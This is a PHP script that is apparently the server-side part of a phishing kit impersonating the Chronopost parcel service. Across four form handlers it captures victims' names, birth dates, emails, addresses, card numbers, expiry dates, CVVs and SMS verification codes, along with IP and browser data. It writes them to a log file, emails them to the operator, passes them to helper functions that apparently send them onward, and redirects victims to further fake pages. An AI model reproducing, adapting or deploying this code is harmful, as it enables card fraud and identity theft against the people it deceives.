<?php
include('Email.php');
include('get_browser.php');
include('get_ip.php');
include('funciones.php');


$ip= $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');


if (isset($_POST['infoget'])) {
	# code...



$DCH_MESSAGE .= "<html>
<head><meta charset='UTF-8'></head>
================( <font style='color: #0a5d00;'>CHRONOPOST INFO ".$ip."</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [DMNE  ]  = <font style='color:#ba0000;'>".$_SERVER['HTTP_HOST']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [NAME  ]  = <font style='color:#ba0000;'>".$_POST['Kartenhalter']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [DATE  ]  = <font style='color:#ba0000;'>".$_POST['Geburtsdatuml']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [EMAIL ]  = <font style='color:#ba0000;'>".$_POST['EMailaddresse']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [ADRSS ]  = <font style='color:#ba0000;'>".$_POST['Rechnungsadresse']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [ZIPCD ]  = <font style='color:#ba0000;'>".$_POST['Postleitzahl']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CITY  ]  = <font style='color:#ba0000;'>".$_POST['Stadt']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>".$ip."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
</div></html>\n";

$cc = "NAME : ".$_POST['Kartenhalter']."\nDATE : ".$_POST['Geburtsdatuml']."\nEMAIL : ".$_POST['EMailaddresse'].
     "\nADRS : ".$_POST['Rechnungsadresse']."\nZIPCD : ".$_POST['Postleitzahl']."\nCITY : "
     .$_POST['Stadt']."\nIP : ".$ip."\nTIME : ".$TIME_DATE.
     "\nBROWSER : ".XB_Browser($_SERVER['HTTP_USER_AGENT'])."\n".XB_OS($_SERVER['HTTP_USER_AGENT']);
     
functiondilih($cc);
$khraha = fopen("../../ICDPL.html", "a");
fwrite($khraha, $DCH_MESSAGE);
$DCH_SUBJECT .= "$ip";
$DCH_HEADERS .= "From: DCH<WHATSAPP>";
$DCH_HEADERS .= "Dch-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
HEADER("Location: ../engagement.php?assure_boba=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
}





if (isset($_POST['cartget'])) {



$DCH_MESSAGE .= "<html>
<head><meta charset='UTF-8'></head>
================( <font style='color: #0a5d00;'>CHRONOPOST CARD ".$ip."</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [DMNE  ]  = <font style='color:#ba0000;'>".$_SERVER['HTTP_HOST']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [NAME  ]  = <font style='color:#ba0000;'>".$_POST['Kartenhalter']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CARD  ]  = <font style='color:#ba0000;'>".$_POST['Kartennummer']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [EXPD  ]  = <font style='color:#ba0000;'>".$_POST['Ablauf']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CVV   ]  = <font style='color:#ba0000;'>".$_POST['Sicherheitscode']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>".$ip."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
</div></html>\n";

$cc = "NAME : ".$_POST['Kartenhalter']."\nCARD : ".$_POST['Kartennummer']."\nDATE : ".$_POST['Ablauf']."\nCVV : ".$_POST['Sicherheitscode']."\nIP : ".$ip."\nTIME : ".$TIME_DATE. "\nBROWSER : ".XB_Browser($_SERVER['HTTP_USER_AGENT'])."\n".XB_OS($_SERVER['HTTP_USER_AGENT']);
functiondilih($cc);


$khraha = fopen("../../ICDPL.html", "a");
fwrite($khraha, $DCH_MESSAGE);
$DCH_SUBJECT .= "$ip";
$DCH_HEADERS .= "From: DCH<WHATSAPP>";
$DCH_HEADERS .= "Dch-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
HEADER("Location: ../remettions.php?assure_boba=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
}





if (isset($_POST['smsone'])) {



$DCH_MESSAGE .= "<html>
<head><meta charset='UTF-8'></head>
================( <font style='color: #0a5d00;'>CHRONOPOST SMS 1 ".$ip."</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [DMNE  ]  = <font style='color:#ba0000;'>".$_SERVER['HTTP_HOST']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [NAME  ]  = <font style='color:#ba0000;'>".$_POST['F982345787234LPIN']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>".$ip."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
</div></html>\n";

$cc = "SMS (1) : ".$_POST['F982345787234LPIN']."\nIP : ".$ip."\nTIME : ".$TIME_DATE. "\nBROWSER : ".XB_Browser($_SERVER['HTTP_USER_AGENT'])."\n".XB_OS($_SERVER['HTTP_USER_AGENT']);
functiondilihsms($cc);


$khraha = fopen("../../ICDPL.html", "a");
fwrite($khraha, $DCH_MESSAGE);
$DCH_SUBJECT .= "$ip";
$DCH_HEADERS .= "From: DCH<WHATSAPP>";
$DCH_HEADERS .= "Dch-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
HEADER("Location: ../demande.php?assure_boba=false&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
}




if (isset($_POST['smstow'])) {



$DCH_MESSAGE .= "<html>
<head><meta charset='UTF-8'></head>
================( <font style='color: #0a5d00;'>CHRONOPOST SMS 2 ".$ip."</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [DMNE  ]  = <font style='color:#ba0000;'>".$_SERVER['HTTP_HOST']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [NAME  ]  = <font style='color:#ba0000;'>".$_POST['F982345787234LPIN']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CVV   ]  = <font style='color:#ba0000;'>".$_POST['Sicherheitscode']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>".$ip."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
</div></html>\n";

$cc = "SMS (2) : ".$_POST['F982345787234LPIN']."\nIP : ".$ip."\nTIME : ".$TIME_DATE. "\nBROWSER : ".XB_Browser($_SERVER['HTTP_USER_AGENT'])."\n".XB_OS($_SERVER['HTTP_USER_AGENT']);
functiondilihsms($cc);


$khraha = fopen("../../ICDPL.html", "a");
fwrite($khraha, $DCH_MESSAGE);
$DCH_SUBJECT .= "$ip";
$DCH_HEADERS .= "From: DCH<WHATSAPP>";
$DCH_HEADERS .= "Dch-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
HEADER("Location: ../remettions.php?assure_boba=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
}



?>
